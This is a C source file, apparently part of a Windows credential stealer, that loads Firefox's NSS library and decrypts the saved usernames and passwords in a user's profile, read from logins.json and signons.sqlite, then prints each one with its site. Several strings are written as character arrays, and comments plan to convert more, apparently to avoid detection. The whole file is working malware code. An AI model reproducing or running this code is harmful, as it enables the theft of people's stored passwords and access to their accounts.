#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <conio.h>
#include <Wincrypt.h>
#include <stdlib.h>
#include <stdio.h>
#include <memory.h>
#include "mem.h"
#include "base64.h"
#include "sqlite3.h"
#include "parson.h"
#include "misc.h"
#include "firefox.h"


NSS_Init_p fpNSS_Init = NULL;
NSS_Shutdown_p fpNSS_Shutdown = NULL;
PL_ArenaFinish_p fpPL_ArenaFinish = NULL;
PR_Cleanup_p fpPR_Cleanup = NULL;
PK11_GetInternalKeySlot_p fpPK11_GetInternalKeySlot = NULL;
PK11_FreeSlot_p fpPK11_FreeSlot = NULL;
PK11SDR_Decrypt_p fpPK11SDR_Decrypt = NULL;

char g_ver[20];

HMODULE moduleNSS;

char *installPath(){
	DWORD cbSize;
	char value[MAX_PATH];
	char *path = "SOFTWARE\\Mozilla\\Mozilla Firefox";

	cbSize = MAX_PATH;
	if (!SHGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize)){
		path = dupcat(path, "\\", value, "\\Main", 0);
		strcpy(g_ver, value);
		cbSize = MAX_PATH;
		if (!SHGetValueA(HKEY_LOCAL_MACHINE, path, "Install Directory", 0, value, &cbSize)){
			int size = strlen(value) + 1;
			char *ret = (char *)calloc(size, 1);
			memcpy(ret, value, size);
			free(path);
			return ret;
		}
	}

	return 0;
}

LPSTR GetFirefoxProfilePath()
{
	// FIXFIXFIX ARRAYARRAYARRAY
	LPSTR strAppData = (LPSTR)talloc(MAX_PATH + 1);
	SHGetSpecialFolderPathA(NULL, strAppData, CSIDL_APPDATA, TRUE);

	LPSTR strIniPath = (LPSTR)talloc(MAX_PATH + 1);
	sprintf_s(strIniPath, MAX_PATH, "%s\\Mozilla\\Firefox\\profiles.ini", strAppData);

	LPSTR strRelativePath = (LPSTR)talloc(MAX_PATH + 1);
	GetPrivateProfileStringA("Profile0", "Path", "", strRelativePath, MAX_PATH, strIniPath);

	LPSTR strFullPath = (LPSTR)talloc(MAX_PATH + 1);
	sprintf_s(strFullPath, MAX_PATH, "%s\\Mozilla\\Firefox\\%s", strAppData, strRelativePath);

	LPSTR strShortPath = (LPSTR)talloc(MAX_PATH + 1);
	GetShortPathNameA(strFullPath, strShortPath, MAX_PATH);

	tfree(strAppData);
	tfree(strIniPath);
	tfree(strRelativePath);
	tfree(strFullPath);

	if (!PathFileExistsA(strShortPath))
	{
		tfree(strShortPath);
		return NULL;
	}
	return strShortPath;
}


LPSTR DecryptString(LPSTR strCryptData)
{
	if (strCryptData[0] == 0x0)
		return FALSE;

	DWORD dwOut;
	LPSTR strClearData;
	LPBYTE lpBuffer = base64_decode((char*)strCryptData, strlen(strCryptData), (int *)&dwOut);
	PK11SlotInfo *pK11Slot = fpPK11_GetInternalKeySlot();
	if (pK11Slot)
	{
		SECItem pInSecItem, pOutSecItem;;
		pInSecItem.data = lpBuffer;
		pInSecItem.len = dwOut;

		pOutSecItem.data = 0;
		pOutSecItem.len = 0;

		if (fpPK11SDR_Decrypt(&pInSecItem, &pOutSecItem, NULL) == 0)
		{
			strClearData = (LPSTR)talloc(pOutSecItem.len + 1);
			memcpy(strClearData, pOutSecItem.data, pOutSecItem.len);
		}

		fpPK11_FreeSlot(pK11Slot);
	}


	tfree(lpBuffer);
	return strClearData;
}

VOID decrypt_firefox_json()
{
	HANDLE hFile, hMap;
	DWORD loginSize = 0;
	CHAR *loginMap, *localLoginMap;
	JSON_Value *root_value;
	JSON_Array *logins;
	JSON_Object *root_object;
	JSON_Object *commit;

	CHAR strLogins[] = { 'l', 'o', 'g', 'i', 'n', 's', '\0' };
	CHAR strURL[] = { 'h', 'o', 's', 't', 'n', 'a', 'm', 'e', '\0' };
	CHAR strUser[] = { 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', 'U', 's', 'e', 'r', 'n', 'a', 'm', 'e', '\0' };
	CHAR strPass[] = { 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '\0' };
	CHAR strFileName[] = { 'l', 'o', 'g', 'i', 'n', 's', '.', 'j', 's', 'o', 'n', 0x0 };
	CHAR strFirefox[] = { 'F', 'i', 'r', 'e', 'f', 'o', 'x', 0x0 };

	LPSTR strUserDecrypted, strPasswordDecrypted;
	CHAR tmp_buff[255];
	CHAR* tmp_file;
	LPSTR strProfilePath = GetFirefoxProfilePath();
	tmp_file = dupcat(strProfilePath, "\\", strFileName);

	if ((hFile = CreateFileA(tmp_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
	{
		free(tmp_file);
		tfree(strProfilePath);
		return;
	}

	loginSize = GetFileSize(hFile, NULL);
	if (loginSize == INVALID_FILE_SIZE)
	{
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
		return;
	}

	localLoginMap = (CHAR*)calloc(loginSize + 1, sizeof(CHAR));
	if (localLoginMap == NULL)
	{
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
		return;
	}

	if ((hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == NULL)
	{
		tfree(localLoginMap);
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
		return;
	}

	if ((loginMap = (CHAR*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)) == NULL)
	{
		CloseHandle(hMap);
		tfree(localLoginMap);
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
	}

	memcpy_s(localLoginMap, loginSize + 1, loginMap, loginSize);

	// parse time

	root_value = json_parse_string(localLoginMap);

	if (root_value == NULL) {
		return;
	}

	root_object = json_value_get_object(root_value);
	logins = json_object_get_array(root_object, "logins");

	if (logins == NULL) {
		return;
	}

	//commit = json_array_get_object(logins, 1);

	for (size_t i = 0; i < json_array_get_count(logins); i++) {

		commit = json_array_get_object(logins, i);

		sprintf_s(tmp_buff, 255, "%s", json_object_get_string(commit, strUser));
		strUserDecrypted = DecryptString(tmp_buff);
		sprintf_s(tmp_buff, 255, "%s", json_object_get_string(commit, strPass));
		strPasswordDecrypted = DecryptString(tmp_buff);

		printf("FIREFOX => uname: %s\tpwd: %s\tsite: %s\n", strUserDecrypted, strPasswordDecrypted, json_object_get_string(commit, strURL));

		free(strUserDecrypted);
		free(strPasswordDecrypted);

	}

	//char *name = NULL;
	//name = json_serialize_to_string_pretty(root_value);
	//MessageBoxA(NULL, name, "", MB_OK);
	//json_free_serialized_string(name);

	json_value_free(root_value);
	UnmapViewOfFile(loginMap);
	CloseHandle(hMap);
	CloseHandle(hFile);

	free(tmp_file);
}

int firefox_worker(LPVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
{
	LPSTR strResource = NULL;
	LPSTR strUser = NULL; 
	LPSTR strPass = NULL; 

	for (DWORD i = 0; i < dwColumns; i++)
	{
		if (!strNames[i])
			continue;

		if (!strcmp(strNames[i], "hostname"))
		{
			strResource = (LPSTR)talloc(1024 * sizeof(char));
			sprintf_s(strResource, 1024, "%s", strValues[i]);
		}
		else if (!strcmp(strNames[i], "encryptedUsername"))
			strUser = DecryptString(strValues[i]);
		else if (!strcmp(strNames[i], "encryptedPassword"))
			strPass = DecryptString(strValues[i]);
	}

	if (strUser && strPass)
	{
		printf("FIREFOX => uname: %s\tpwd: %s\tsite: %s\n", strUser, strPass, strResource);
	}

	tfree(strResource);
	tfree(strUser);
	tfree(strPass);
	return 0;
}

VOID decrypt_firefox_sql()
{
	LPSTR strProfilePath = GetFirefoxProfilePath();

	if (!strProfilePath)
		return;

	DWORD dwSize = strlen(strProfilePath) + 1024;
	LPSTR strFilePath = (LPSTR)talloc(dwSize);
	CHAR strFileName[] = { 's', 'i', 'g', 'n', 'o', 'n', 's', '.', 's', 'q', 'l', 'i', 't', 'e', 0x0 };
	sprintf_s(strFilePath, dwSize, "%s\\%s", strProfilePath, strFileName);

	sqlite3 *lpDb = NULL;
	if (sqlite3_open((const char *)strFilePath, &lpDb) == SQLITE_OK)
	{
		sqlite3_exec(lpDb, "SELECT * FROM moz_logins;", firefox_worker, 0, NULL); // FIXME: char array
		sqlite3_close(lpDb);
	}


	tfree(strFilePath);
	tfree(strProfilePath);
}

BOOL init_firefox_api(){
	char *dlpath = installPath();
	char *path = getenv("PATH");
	if (path){
		char *newPath = dupcat(path, ";", dlpath, 0);
		_putenv(dupcat("PATH=", newPath, 0));
		free(newPath);
	}
	moduleNSS = LoadLibraryA((dupcat(dlpath, "\\nss3.dll", 0)));


	if (moduleNSS){

		fpNSS_Init = (NSS_Init_p)GetProcAddress(moduleNSS, "NSS_Init");  //FIXME: array
		fpNSS_Shutdown = (NSS_Shutdown_p)GetProcAddress(moduleNSS, "NSS_Shutdown");  //FIXME: array
		fpPL_ArenaFinish = (PL_ArenaFinish_p)GetProcAddress(moduleNSS, "PL_ArenaFinish");  //FIXME: array
		fpPR_Cleanup = (PR_Cleanup_p)GetProcAddress(moduleNSS, "PR_Cleanup");  //FIXME: array
		fpPK11_GetInternalKeySlot = (PK11_GetInternalKeySlot_p)GetProcAddress(moduleNSS, "PK11_GetInternalKeySlot");  //FIXME: array
		fpPK11_FreeSlot = (PK11_FreeSlot_p)GetProcAddress(moduleNSS, "PK11_FreeSlot");  //FIXME: array
		fpPK11SDR_Decrypt = (PK11SDR_Decrypt_p)GetProcAddress(moduleNSS, "PK11SDR_Decrypt");  //FIXME: array

		if (!fpNSS_Init || !fpNSS_Shutdown || !fpPL_ArenaFinish || !fpPR_Cleanup || !fpPK11_GetInternalKeySlot || !fpPK11_FreeSlot || !fpPK11SDR_Decrypt)
			return FALSE;

		return TRUE;
	}
	return FALSE;
}

VOID UnloadFirefoxLibs()
{
	if (moduleNSS && fpNSS_Shutdown && fpPL_ArenaFinish && fpPR_Cleanup)
	{
		fpNSS_Shutdown();
		fpPL_ArenaFinish();
		fpPR_Cleanup();

		FreeLibrary(moduleNSS);
	}
}

VOID dump_firefox_passwords()
{
	if (!init_firefox_api())
	{
		printf("firefox error\n");
		return;
	}

	LPSTR strProfilePath = GetFirefoxProfilePath();
	DWORD dwRet = fpNSS_Init(strProfilePath);

	decrypt_firefox_json();
	decrypt_firefox_sql();

	UnloadFirefoxLibs();
}